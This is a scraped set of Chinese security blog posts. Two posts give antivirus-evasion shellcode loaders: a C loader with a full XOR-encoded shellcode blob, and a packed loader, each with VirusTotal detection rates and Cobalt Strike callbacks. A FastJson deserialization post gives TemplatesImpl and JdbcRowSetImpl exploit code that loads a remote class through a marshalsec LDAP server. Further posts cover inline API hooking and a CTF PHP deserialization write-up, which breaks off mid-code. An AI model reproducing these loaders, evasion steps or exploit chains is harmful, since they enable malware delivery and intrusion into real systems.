将shellcode与0x97异或后生成新的shellcode Ctrl+Shift+c复制shellcode到Sublime text中，Ctrl+a选中全部将shellcode修改成c语言中的十六进制格式 Visual Studio编译生成exe文件将xor加密后的shellcode与0x97异或还原后执行 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;windows.h&gt;#include &lt;stdio.h&gt;typedef void(_stdcall *CODE)();#pragma comment(linker,&quot;/subsystem:\\&quot;windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot;)unsigned char shellcode[] =&quot;\\x6B\\xDF\\x14\\x73\\x67\\x7F\\x5F\\x97\\x97\\x97\\xD6\\xC6\\xD6\\xC7\\xC5\\xC6&quot;&quot;\\xC1\\xDF\\xA6\\x45\\xF2\\xDF\\x1C\\xC5\\xF7\\xDF\\x1C\\xC5\\x8F\\xDF\\x1C\\xC5&quot;&quot;\\xB7\\xDF\\x1C\\xE5\\xC7\\xDF\\x98\\x20\\xDD\\xDD\\xDA\\xA6\\x5E\\xDF\\xA6\\x57&quot;&quot;\\x3B\\xAB\\xF6\\xEB\\x95\\xBB\\xB7\\xD6\\x56\\x5E\\x9A\\xD6\\x96\\x56\\x75\\x7A&quot;&quot;\\xC5\\xD6\\xC6\\xDF\\x1C\\xC5\\xB7\\x1C\\xD5\\xAB\\xDF\\x96\\x47\\xF1\\x16\\xEF&quot;&quot;\\x8F\\x9C\\x95\\xE2\\xE5\\x1C\\x17\\x1F\\x97\\x97\\x97\\xDF\\x12\\x57\\xE3\\xF0&quot;&quot;\\xDF\\x96\\x47\\xC7\\x1C\\xDF\\x8F\\xD3\\x1C\\xD7\\xB7\\xDE\\x96\\x47\\x74\\xC1&quot;&quot;\\xDF\\x68\\x5E\\xD6\\x1C\\xA3\\x1F\\xDF\\x96\\x41\\xDA\\xA6\\x5E\\xDF\\xA6\\x57&quot;&quot;\\x3B\\xD6\\x56\\x5E\\x9A\\xD6\\x96\\x56\\xAF\\x77\\xE2\\x66\\xDB\\x94\\xDB\\xB3&quot;&quot;\\x9F\\xD2\\xAE\\x46\\xE2\\x4F\\xCF\\xD3\\x1C\\xD7\\xB3\\xDE\\x96\\x47\\xF1\\xD6&quot;&quot;\\x1C\\x9B\\xDF\\xD3\\x1C\\xD7\\x8B\\xDE\\x96\\x47\\xD6\\x1C\\x93\\x1F\\xDF\\x96&quot;&quot;\\x47\\xD6\\xCF\\xD6\\xCF\\xC9\\xCE\\xCD\\xD6\\xCF\\xD6\\xCE\\xD6\\xCD\\xDF\\x14&quot;&quot;\\x7B\\xB7\\xD6\\xC5\\x68\\x77\\xCF\\xD6\\xCE\\xCD\\xDF\\x1C\\x85\\x7E\\xD8\\x68&quot;&quot;\\x68\\x68\\xCA\\xFD\\x97\\xDE\\x29\\xE0\\xFE\\xF9\\xFE\\xF9\\xF2\\xE3\\x97\\xD6&quot;&quot;\\xC1\\xDE\\x1E\\x71\\xDB\\x1E\\x66\\xD6\\x2D\\xDB\\xE0\\xB1\\x90\\x68\\x42\\xDF&quot;&quot;\\xA6\\x5E\\xDF\\xA6\\x45\\xDA\\xA6\\x57\\xDA\\xA6\\x5E\\xD6\\xC7\\xD6\\xC7\\xD6&quot;&quot;\\x2D\\xAD\\xC1\\xEE\\x30\\x68\\x42\\x7C\\xE4\\xCD\\xDF\\x1E\\x56\\xD6\\x2F\\xC7&quot;&quot;\\x97\\x97\\x97\\xDA\\xA6\\x5E\\xD6\\xC6\\xD6\\xC6\\xFD\\x94\\xD6\\xC6\\xD6\\x2D&quot;&quot;\\xC0\\x1E\\x08\\x51\\x68\\x42\\x7C\\xCE\\xCC\\xDF\\x1E\\x56\\xDF\\xA6\\x45\\xDE&quot;&quot;\\x1E\\x4F\\xDA\\xA6\\x5E\\xC5\\xFF\\x97\\x95\\xD7\\x13\\xC5\\xC5\\xD6\\x2D\\x7C&quot;&quot;\\xC2\\xB9\\xAC\\x68\\x42\\xDF\\x1E\\x51\\xDF\\x14\\x54\\xC7\\xFD\\x9D\\xC8\\xDF&quot;&quot;\\x1E\\x66\\xDF\\x1E\\x4D\\xDE\\x50\\x57\\x68\\x68\\x68\\x68\\xDA\\xA6\\x5E\\xC5&quot;&quot;\\xC5\\xD6\\x2D\\xBA\\x91\\x8F\\xEC\\x68\\x42\\x12\\x57\\x98\\x12\\x0A\\x96\\x97&quot;&quot;\\x97\\xDF\\x68\\x58\\x98\\x13\\x1B\\x96\\x97\\x97\\x7C\\x44\\x7E\\x73\\x96\\x97&quot;&quot;\\x97\\x7F\\x35\\x68\\x68\\x68\\xB8\\xED\\xDE\\xD1\\xC3\\x97\\x78\\x6F\\xCF\\x9C&quot;&quot;\\xEF\\x6F\\x7B\\x00\\x38\\x66\\xFD\\xA8\\xFF\\x7B\\xCF\\xF8\\x9A\\x4B\\xA7\\x08&quot;&quot;\\x95\\x69\\x8B\\x57\\xDF\\x10\\xFE\\x9E\\xB6\\x17\\x81\\xB4\\xC6\\x50\\x5A\\xE7&quot;&quot;\\xFD\\x31\\x7C\\xF6\\x3A\\xD4\\xCA\\x4D\\xA2\\x00\\x6B\\xBF\\x1D\\xB4\\x62\\x1B&quot;&quot;\\xC6\\xA3\\x87\\x19\\xEE\\x2E\\xBA\\x2A\\x4B\\xD8\\x89\\x65\\xB2\\xF3\\xB0\\xC8&quot;&quot;\\xF3\\x1B\\x92\\x1A\\xFF\\x97\\xC2\\xE4\\xF2\\xE5\\xBA\\xD6\\xF0\\xF2\\xF9\\xE3&quot;&quot;\\xAD\\xB7\\xDA\\xF8\\xED\\xFE\\xFB\\xFB\\xF6\\xB8\\xA2\\xB9\\xA7\\xB7\\xBF\\xF4&quot;&quot;\\xF8\\xFA\\xE7\\xF6\\xE3\\xFE\\xF5\\xFB\\xF2\\xAC\\xB7\\xDA\\xC4\\xDE\\xD2\\xB7&quot;&quot;\\xA6\\xA7\\xB9\\xA7\\xAC\\xB7\\xC0\\xFE\\xF9\\xF3\\xF8\\xE0\\xE4\\xB7\\xD9\\xC3&quot;&quot;\\xB7\\xA1\\xB9\\xA5\\xAC\\xB7\\xC0\\xFE\\xF9\\xA1\\xA3\\xAC\\xB7\\xEF\\xA1\\xA3&quot;&quot;\\xAC\\xB7\\xC3\\xE5\\xFE\\xF3\\xF2\\xF9\\xE3\\xB8\\xA1\\xB9\\xA7\\xBE\\x9A\\x9D&quot;&quot;\\x97\\x64\\xF1\\xB2\\xFD\\x10\\x92\\x3B\\x83\\x57\\x64\\x8C\\xAA\\x47\\xD8\\x6B&quot;&quot;\\xB3\\xE3\\xBE\\xF9\\x75\\x1C\\xA5\\xD6\\x70\\x91\\xE2\\xF2\\x6A\\xA1\\xB6\\xF0&quot;&quot;\\x32\\x70\\x6D\\x9F\\xE9\\xD6\\x2F\\xA9\\x34\\x2F\\x15\\x73\\xD8\\x66\\x8F\\x20&quot;&quot;\\x1D\\x9A\\xCA\\xBF\\x50\\x3C\\x69\\x66\\xA7\\x99\\xB9\\x80\\xF3\\xEF\\x82\\x8E&quot;&quot;\\xC2\\xC5\\x9A\\x01\\xD2\\xDC\\x79\\x99\\xEE\\x32\\x4C\\x6C\\xB0\\x2E\\x1E\\xF0&quot;&quot;\\xCD\\x26\\x7C\\xE3\\x1D\\x78\\x82\\xF1\\xFD\\x88\\xB7\\x23\\x9D\\xCC\\x7A\\x5A&quot;&quot;\\xE5\\x46\\xF0\\xD7\\xCA\\xCC\\x3E\\xAB\\xF5\\x09\\xBB\\x3C\\x52\\x1E\\xAB\\x1A&quot;&quot;\\x3A\\x2F\\xF7\\x1E\\xF7\\xCF\\xA6\\x2B\\x93\\xBF\\xAB\\xFB\\xF7\\x44\\x2E\\xD8&quot;&quot;\\x69\\x64\\x26\\xD9\\xB6\\xB2\\xB9\\xDF\\xF6\\x27\\x52\\x8A\\x1A\\x26\\x81\\x14&quot;&quot;\\xFD\\xD6\\x88\\xD6\\x23\\x1F\\x6E\\xFC\\x09\\x30\\x57\\xEC\\x80\\xE1\\x14\\xF9&quot;&quot;\\x62\\x5A\\x84\\xA4\\x85\\xA1\\xC8\\xE2\\x43\\xFC\\x6E\\x18\\x95\\x90\\x7E\\x31&quot;&quot;\\x03\\x78\\x32\\x18\\x9A\\x89\\xDA\\xAF\\x84\\x5B\\x95\\x21\\x78\\xF4\\xA3\\x7F&quot;&quot;\\x82\\x36\\x32\\xE0\\x44\\x13\\x1A\\x39\\xE2\\x47\\xE7\\xED\\xA3\\x93\\x80\\x53&quot;&quot;\\x05\\xCC\\x5A\\xBD\\x3E\\x97\\xD6\\x29\\x67\\x22\\x35\\xC1\\x68\\x42\\xDF\\xA6&quot;&quot;\\x5E\\x2D\\x97\\x97\\xD7\\x97\\xD6\\x2F\\x97\\x87\\x97\\x97\\xD6\\x2E\\xD7\\x97&quot;&quot;\\x97\\x97\\xD6\\x2D\\xCF\\x33\\xC4\\x72\\x68\\x42\\xDF\\x04\\xC4\\xC4\\xDF\\x1E&quot;&quot;\\x70\\xDF\\x1E\\x66\\xDF\\x1E\\x4D\\xD6\\x2F\\x97\\xB7\\x97\\x97\\xDE\\x1E\\x6E&quot;&quot;\\xD6\\x2D\\x85\\x01\\x1E\\x75\\x68\\x42\\xDF\\x14\\x53\\xB7\\x12\\x57\\xE3\\x21&quot;&quot;\\xF1\\x1C\\x90\\xDF\\x96\\x54\\x12\\x57\\xE2\\x40\\xCF\\xCF\\xCF\\xDF\\x92\\x97&quot;&quot;\\x97\\x97\\x97\\xC7\\x54\\x7F\\x08\\x6A\\x68\\x68\\xA6\\xAE\\xA5\\xB9\\xA6\\xA1&quot;&quot;\\xAF\\xB9\\xA5\\xA7\\xA3\\xB9\\xA6\\xA3\\xA4\\x97\\x85\\xA3\\xC1\\xEF&quot;;unsigned char xorshellcode[sizeof(shellcode)];void main(){ for (int i = 0; i &lt; sizeof(shellcode) - 1; i++) { xorshellcode[i] = shellcode[i]^0x97; } PVOID p = NULL; p = VirtualAlloc(NULL, sizeof(xorshellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (p == NULL) { return; } memcpy(p, xorshellcode, sizeof(xorshellcode)); CODE code = (CODE)p; code();} 免杀效果测试VirusTotal查杀率15/69 火绒不杀，卡巴斯基拦截 cs上线 参考:https://www.freebuf.com/articles/system/228233.html https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html","link":"/2020/12/06/C-xor%E5%8A%A0%E5%AF%86%E5%85%8D%E6%9D%80/"},{"title":"C编译shellcode+shielden加壳免杀火绒、卡巴斯基","text":"CS 生成 shellcode在Payload Generator处选择veil，生成shellcode 生成shellcode 使用Visual Studio 2017编译shellcode复制shellcode到以下代码中 123456789101112131415// MSF.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。#include &lt;iostream&gt;#include &quot;stdio.h&quot;#include &quot;Windows.h&quot;#pragma comment(linker,&quot;/subsystem:\\&quot;windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot;) //去除窗口//步骤b所在桌面产生的 shellcode.c的内容;unsigned char shellcode[] = &quot;&quot;;void main(){ //ShellExecute(NULL, _T(&quot;open&quot;), _T(&quot;explorer.exe&quot;), _T(&quot;https://www.baiud.com&quot;), NULL, SW_SHOW); LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(Memory, shellcode, sizeof(shellcode)); ((void(*)())Memory)();} 在Visual Studio中新建控制台应用程序并复制代码 按如图设置编译选项 选择重新生成解决方案，生成ConsoleApplication4.exe 使用用Restorator 2018为生成的exe文件添加图标将ConsoleApplication4.exe拖入Restorator 2018，右键选择添加资源，名称可随意填写 将ico文件拖入Restorator 2018并保存 运用shielden为exe文件加壳设置如下 免杀效果virustotal.com上 shellcode_launcher.exe 查杀率为17/71 本地测试，静态扫描火绒与卡巴斯基均不查杀 cs上线 参考链接使用 C 编译 shellcode 免杀上线","link":"/2020/11/25/C%E7%BC%96%E8%AF%91shellcode-shielden%E5%8A%A0%E5%A3%B3%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92%E3%80%81%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA/"},{"title":"FastJson反序列化","text":"Fastjson使用astjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换，提供两个主要接口JSON.toJSONString和JSON.parseObject/JSON.parse来分别实现序列化和反序列化操作。 pom.xml设置 12345&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.24&lt;/version&gt; &lt;/dependency&gt; 先定义一个User类 1234567891011121314151617181920public class User { private String name; private int age; public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; }} FastJson反序列化有三种方法 12345678910111213141516171819202122232425262728293031import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.serializer.SerializerFeature;public class Test { public static void main(String[] args) { User user=new User(); user.setName(&quot;admin&quot;); user.setAge(14); //序列化 String serializedStr=JSON.toJSONString(user); System.out.println(serializedStr); //反序列化 Object obj1=JSON.parse(serializedStr); System.out.println(&quot;通过parse方法反序列化&quot;); System.out.println(obj1.getClass().getName()); System.out.println(obj1); Object obj2=JSON.parseObject(serializedStr); System.out.println(&quot;通过parseObject方法，不指定类进行反序列化&quot;); System.out.println(obj2.getClass().getName()); System.out.println(obj2); Object obj3=JSON.parseObject(serializedStr,User.class); System.out.println(&quot;通过parseObject方法，指定User类进行反序列化&quot;); System.out.println(obj3.getClass().getName()); System.out.println(obj3); }} 执行结果如下 可以看到JSON.parse和未指定对象的JSON.parseObject都会返回JSONObject，而JSON.parseObject指定类后会返回相应的类对象。它们不仅返回结果不同，执行过程中调用的方法也不同。 type字段修改User类 12345678910111213141516171819202122232425public class User { private String name; private int age; public String getName() { System.out.println(&quot;getName&quot;); return name; } public void setName(String name) { System.out.println(&quot;setName&quot;); this.name = name; } public int getAge() { System.out.println(&quot;getAge&quot;); return age; } public void setAge(int age) { System.out.println(&quot;setAge&quot;); this.age = age; }} FastJson中有一个特殊字段type，这个字段可以指定反序列化任意类，并且会自动调用类中符合规则的特定的setter和getter方法。 12345parse(&quot;&quot;) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法parseObject(&quot;&quot;) 会调用反序列化目标类的特定 setter 和 getter 方法parseObject(&quot;&quot;,class) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法 规则 1234567891011set开头的方法要求如下：- 方法名长度大于4且以set开头，且第四个字母要是大写- 非静态方法- 返回类型为void或当前类- 参数个数为1个get开头的方法要求如下：- 方法名长度大于等于4 - 非静态方法- 以get开头且第4个字母为大写- 无传入参数- 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong Demo 123456789101112131415161718192021222324252627import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.serializer.SerializerFeature;public class Test { public static void main(String[] args) { String jsonstring=&quot;{\\&quot;@type\\&quot;:\\&quot;User\\&quot;,\\&quot;age\\&quot;:80,\\&quot;name\\&quot;:\\&quot;admin\\&quot;}&quot;; System.out.println(&quot;parse:&quot;); Object obj1=JSON.parse(jsonstring); System.out.println(obj1.getClass().getName()); System.out.println(obj1); System.out.println(&quot;parseObject:&quot;); Object obj2=JSON.parseObject(jsonstring); System.out.println(obj2.getClass().getName()); System.out.println(obj2); System.out.println(&quot;parseObject with class:&quot;); Object obj3=JSON.parseObject(jsonstring,User.class); System.out.println(obj3.getClass().getName()); System.out.println(obj3); }} 运行结果 12345type可以指定反序列化成服务器上的任意类然后服务端会解析这个类，提取出这个类中符合要求的setter方法与getter方法（如setxxx）如果传入json字符串的键值中存在这个值（如xxx)，就会去调用执行对应的setter、getter方法（即setxxx方法、getxxx方法） 利用链TemplatesImpl基于JDK 7u21 Gadgets，1.7版本通用，利用条件苛刻 利用条件 1231. 服务端使用parseObject()时，必须使用如下格式才能触发漏洞： `JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);`2. 服务端使用parse()时，需要`JSON.parse(text1,Feature.SupportNonPublicField);` jdk7u21反序列化的利用条件 123451.恶意类的父类必须为ABSTRACT_TRANSLET 2.TemplatesImpl类的_bytecodes不为null，为恶意类字节码，payload写在恶意类的静态方法或构造方法3.TemplatesImpl类的_name不为null4.TemplatesImpl类的_class=null5._tfactory需要是一个拥有getExternalExtensionsMap()方法的类，即TransformerFactoryImpl()，以此来兼容不同版本 构造exp，FastJson反序列化过程中对_bytecodes、_tfactory等属性进行了操作，需要另外处理 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.Feature;import com.alibaba.fastjson.parser.ParserConfig;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.*;import org.apache.commons.codec.binary.Base64;public class Test { public static byte[] getevilbyte() throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass ctClass = pool.makeClass(&quot;Evil&quot;); //向静态方法中插入要执行的命令 ctClass.makeClassInitializer().insertBefore(&quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;); //设置满足条件的父类 ctClass.setSuperclass((pool.get(AbstractTranslet.class.getName()))); //获取字节码 byte[] EvilByteCodes = ctClass.toBytecode(); return EvilByteCodes; } public static void main(String[] args) throws Exception { //生成恶意类字节码 byte[] evilCode = getevilbyte(); //将字节码进行base64编码 String evilCode_base64 = Base64.encodeBase64String(evilCode); String text1 = &quot;{&quot;+ &quot;\\&quot;@type\\&quot;:\\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\&quot;,&quot;+ &quot;\\&quot;_bytecodes\\&quot;:[\\&quot;&quot;+evilCode_base64+&quot;\\&quot;],&quot;+ &quot;'_name':'xx',&quot;+ &quot;'_tfactory':{ },&quot;+ &quot;'_outputProperties':{ }&quot;+ &quot;}\\n&quot;; System.out.println(text1); //处理private属性 ParserConfig config = new ParserConfig(); //反序列化 Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); }} _bytecodes_bytecodes传输过程中会经过base64解码，所以在payload中需要进行base64编码 FieldDeserializer#parseField parseField中对_bytecodes中的内容进行了解析 deserialize parseArray ObjectDeserializer#deserializer byteValue 对_bytecodes进行base64解码 _tfactoryFastJson会自动新建一个符合要求的对象实例，所以exp中_factory为{} 1/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java JdbcRowSetImpl前面提到了FastJson反序列化会自动调用类中符合规则的特定的setter和getter方法。com.sun.rowset.JdbcRowSetImpl的setAutoCommit()方法中调用了lookup()，且参数DataSourceName可控，由setDataSourceName()方法设置。由于这两个方法都符合规则，反序列化时自动调用这两个setter方法造成JNDI注入，进而触发命令执行。 JdbcRowSetImpl#setDataSourceName 调用父类的setDataSourceName BaseRowSet#setDataSourceName 父类的setDataSourceName，把var1赋值给dataSoruce setAutoCommit 这里调用了connect()方法，var1来源于POC中构造的属性autoCommit，实际测试中发现这个值可以是true也可以是false，只要保证有一个布尔类型的参数传入就不会影响正常执行。 connection 调用lookup，this.getDataSourceName()等于var1，接着请求我们的ldap服务器，触发命令执行 接下来就是JNDI注入利用的思路了 使用marshalsec搭建ldap服务器 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8090/#ExecTest ExecTest 1234567891011121314151617181920212223242526272829303132333435363738394041424344import java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;import java.io.Reader;import javax.print.attribute.standard.PrinterMessageFromOperator;public class ExecTest { public ExecTest() throws IOException,InterruptedException{ String cmd=&quot;calc&quot;; final Process process = Runtime.getRuntime().exec(cmd); printMessage(process.getInputStream());; printMessage(process.getErrorStream()); int value=process.waitFor(); System.out.println(value); } private static void printMessage(final InputStream input) { // TODO Auto-generated method stub new Thread (new Runnable() { @Override public void run() { // TODO Auto-generated method stub Reader reader =new InputStreamReader(input); BufferedReader bf = new BufferedReader(reader); String line = null; try { while ((line=bf.readLine())!=null) { System.out.println(line); } }catch (IOException e){ e.printStackTrace(); } } }).start(); } public static void main(String[] args) { }} 把编译后的恶意类ExecTest.class放到web目录下，然后开启web服务 利用 123456789101112131415import com.alibaba.fastjson.JSON;public class Test { public static void main(String[] args) throws Exception { String payload = &quot;{\\n&quot; + &quot; \\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\n&quot; + &quot; \\&quot;dataSourceName\\&quot;:\\&quot;ldap://192.168.111.129:1389/ExecTest\\&quot;,\\n&quot; + &quot; \\&quot;autoCommit\\&quot;:true\\n&quot; + &quot;}&quot;; JSON.parseObject(payload); }} 实际执行的代码 12345678910import com.sun.rowset.JdbcRowSetImpl;public class CLIENT { public static void main(String[] args) throws Exception { JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl(); JdbcRowSetImpl_inc.setDataSourceName(&quot;ldap://192.168.111.129:1389/ExecTest&quot;); JdbcRowSetImpl_inc.setAutoCommit(true); }}","link":"/2021/04/25/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"Inline Hook(内联钩子)","text":"原理API函数保存在操作系统的DLL文件中，在运行程序后程序会将API所在的DLL加载入进程中，当在程序中使用某个API函数时。这样程序就会像调用自己的函数一样调用API，大体过程如图1所示。 图1 调用API函数的大体过程 从图1中可以看出，在进程中当EXE模块调用CreateFile()函数的时候，会去调用kernel32.dll模块中的CreateFile()函数，因为真正的CreateFile()函数的实现在kernel32.dll模块中。 CreateFile()是API函数，API函数也是由人编写的代码再编译而成的，也有其对应的二进制代码。既然是代码，那么就可以被修改。通过一种“野蛮”的方法来直接修改API函数在内存中的映像，从而对API函数进行HOOK。使用的方法是，直接使用汇编指令的jmp指令将其代码执行流程改变，进而执行我们的代码，这样就使原来的函数的流程改变了。执行完我们的流程以后，可以选择性地执行原来的函数，也可以不继续执行原来的函数。 假设要对某进程的kernel32.dll的CreateFile()函数进行HOOK，首先需要在指定进程中的内存中找到CreateFile()函数的地址，然后修改CreateFile()函数的首地址的代码为jmpMyProc的指令。这样，当指定的进程调用CreateFile()函数时，就会首先跳转到我们的函数当中去执行流程，这样就完成了我们的HOOK了。 由于这种方法是在程序流程中直接进行嵌入jmp指令来改变流程的，所以就把它叫做Inline Hook。 实现Inline Hook是在程序中嵌入了jmp指令然后跳转到我们的程序流程中继续执行的，jmp指令的用法是jmp 目的地址，减5是因为jmp xxxx指令机器码长5个字节 jmp后的偏移量 = 目的地址 - 源地址 - 5 目的地址：钩子函数地址 源地址：要HOOK的函数地址 梳理一下我们内联钩子的流程： 构造jmp指令 在内存中找到想要HOOK的函数地址，并保存为HOOK位置处的前5个字节 将构造的跳转指令写入需要HOOK的位置 当HOOK位置被执行时会跳转到我们的执行流程 如果要继续原来的流程，那么取消HOOK，也就是还原被修改的字节 执行原来的流程 继续HOOK住原来的位置 代码先封装一个CILHook类， 头文件CILHook.h 123456789101112131415161718192021#pragma once#include &lt;Windows.h&gt;#include &lt;tchar.h&gt;class CILHook{public: CILHook(); ~CILHook(); BOOL Hook(LPCTSTR pszModuleName, LPCSTR pszFuncName, PROC pfnHookFunc); void UnHook(); BOOL ReHook();private: FARPROC m_pfnOrig; BYTE m_bOldBytes[5]; BYTE m_bNewBytes[5];//m_bNewBytes[0] = '\\xe9'，为jmp的机器码，m_bNewBytes为jmp指令}; CILHook.cpp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &quot;CILHook.h&quot;CILHook::CILHook(){ m_pfnOrig = NULL; ZeroMemory(m_bNewBytes, 5); ZeroMemory(m_bOldBytes, 5);}CILHook::~CILHook() { UnHook();}//本质就是把User32.dll中的MessageBox的地址换成钩子函数地址//模块名 pszModuleName, 函数名 pszFuncName, 钩子函数 pfnHookFuncBOOL CILHook::Hook(LPCWSTR pszModuleName, LPCSTR pszFuncName, PROC pfnHookFunc) { BOOL bRet = FALSE; //获取指定模块中函数的地址，User32.dll中的MessageBox m_pfnOrig = GetProcAddress(GetModuleHandle(pszModuleName), pszFuncName); if (m_pfnOrig != NULL) { //保存该地址处5个字节的内容到m_bOldBytes DWORD dwNum = 0; ReadProcessMemory(GetCurrentProcess(), (LPCVOID)m_pfnOrig, m_bOldBytes, 5, &amp;dwNum); m_bNewBytes[0] = '\\xe9';//jmp的机器码 //pfnhookfunc是HOOK后的目标地址，m_pfnOrig是原来的地址，5是指令长度 *(DWORD*)(m_bNewBytes + 1) = (DWORD)pfnHookFunc - (DWORD)m_pfnOrig - 5; WriteProcessMemory(GetCurrentProcess(), (LPVOID)m_pfnOrig, m_bNewBytes, 5, &amp;dwNum); bRet = TRUE; } return bRet;}//解除Hookvoid CILHook::UnHook(){ BOOL bRet = FALSE; if (!m_pfnOrig != 0) { DWORD dwNum = 0; WriteProcessMemory(GetCurrentProcess(), m_pfnOrig, m_bNewBytes, 5, &amp;dwNum); bRet = TRUE; } }BOOL CILHook::ReHook() { BOOL bRet = FALSE; if (m_pfnOrig != 0) { DWORD dwNum = 0; WriteProcessMemory(GetCurrentProcess(), (LPVOID)m_pfnOrig, m_bNewBytes, 5, &amp;dwNum); bRet = TRUE; } return bRet;} 主程序代码 12345678910111213141516171819202122#include &lt;iostream&gt;#include &quot;CILHook.h&quot;CILHook MsgHook;//钩子函数，弹出内容为HOOK的对话框int WINAPI MyMessageBoxW(HWND hWnd,LPCWSTR lpText,LPCWSTR lpCaption,UINT uType) { MsgHook.UnHook(); MessageBox(NULL, _T(&quot;Hook&quot;), lpCaption, uType);//钩子函数弹出Hook MsgHook.ReHook(); return 0;}int main(){ //hook后的MessageBox MsgHook.Hook(_T(&quot;User32.dll&quot;), &quot;MessageBoxA&quot;, (FARPROC)MyMessageBoxW); MessageBox(NULL, _T(&quot;test&quot;), _T(&quot;test&quot;), MB_OK);//如果成功，弹出的内容不是test而是Hook。 MsgHook.UnHook(); return 0;} 利用过程在windows 10中测试失败，仍然执行正常的MessageBox函数，原因是windows 10操作系统中采用ASLR(地址随机化)，用公式计算出来的偏移地址是无效的，所以无法jmp到钩子函数执行。而且在多线程系统中，可能有某个线程就在这个时候调用了修改的系统函数，造成无法预期的结果。在windows 10中，可以使用微软的一个轻量级的开源库——detours来完成Hook。 使用detours进行API Hook这里可以使用微软的一个轻量级的开源库来完成Hook。Detours是微软提供的一个开发库，使用它可以简单、高效、稳定地实现API HOOK的功能。 安装在Visual Studio中选择工具-&gt;NuGet包管理器-&gt;程序包管理器控制台 输入安装命令会自动安装Detours库： 1Install-Package Detours 导入代码如下： 12#include &lt;detours.h&gt;#pragma comment (lib,&quot;detours.lib&quot;) 代码123456789101112131415161718192021222324252627#include &lt;Windows.h&gt;#include &lt;detours.h&gt;#pragma comment (lib,&quot;detours.lib&quot;)static int (WINAPI* OldMesssageBoxA)( HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType ) = MessageBoxA;int WINAPI MyFunction0(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType){ return OldMesssageBoxA(NULL, &quot;Hooked&quot;, &quot;Warning&quot;, MB_OKCANCEL);}int main() { DetourTransactionBegin(); DetourUpdateThread(GetCurrentThread()); DetourAttach(&amp;(PVOID&amp;)OldMesssageBoxA, MyFunction0); DetourTransactionCommit(); MessageBox(NULL, _T(&quot;test&quot;), _T(&quot;test&quot;), MB_OK); return 0;} 利用过程成功 具体内容和利用可见 渗透技巧——从远程桌面客户端提取明文凭据 Detours InLine Hook","link":"/2021/02/03/Inline-Hook-%E5%86%85%E8%81%94%E9%92%A9%E5%AD%90/"},{"title":"GYCTF2020 Easyphp","text":"[GYCTF2020]Easyphp反序列化字符串逃逸 下载www.zip开始审计 目录结构如下，lib.php中存在反序列化利用链 反序列化1.update.php实例化User类并调用update() 2.User类的update方法unserialize($this-&gt;getNewinfo())，序列化内容来自于getNewinfo方法 3.User类的getNewInfo()方法，将Info类序列化，并且safe函数改变了序列化字符串，存在字符逃逸。只要传入union，就会被自动替换成hacker，payload有多长，就输入多少个union，这样多出来一个字符，利用这个特性满足前面的字符串长度后，后面的语句从字符串中逃逸出来，成功反序列化。 4.Info类中的属性均可控，age属性和nickname属性均由post传值得到。利用safe函数增加字符的功能进行字符串逃逸，反序列化恶意类UpdateHelper，这样即可执行任意sql语句。 恶意类1.UpdateHelper类__destruct()方法，令UpdateHelper类的sql属性等于User类触发__toString()方法 2.User类的__toString()方法，只要让nickname属性等于Info类即可触发__call()方法 3.Info类的__call()方法,令属性CtrlCase等于dbCtrl类,调用其中的login方法，执行语句$argument[0]实际来源于User类的age属性 4.dbCtrl类的login方法，接收$sql参数并执行它，传入参数可控，可以执行任意sql语句。需要令name属性等于admin，绑定到sql语句中的?中。然后令token属性等于admin，即可返回$idResult，看到sql语句执行的结果。 利用构造exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpclass User{ public $id; public $age=&quot;select password,id from user where username=?&quot;; public $nickname;}class Info{ public $age; public $nickname; public $CtrlCase;}Class UpdateHelper{ public $id; public $newinfo; public $sql;}class dbCtrl{ public $hostname=&quot;127.0.0.1&quot;; public $dbuser=&quot;root&quot;; public $dbpass=&quot;root&quot;; public $database=&quot;test&quot;; public $name=&quot;admin&quot;; public $password; public $mysqli; public $token=&quot;admin&quot;;}$a=new UpdateHelper();$a-&gt;sql=new User();$a-&gt;sql-&gt;nickname=new Info();$a-&gt;sql-&gt;nickname-&gt;CtrlCase=new 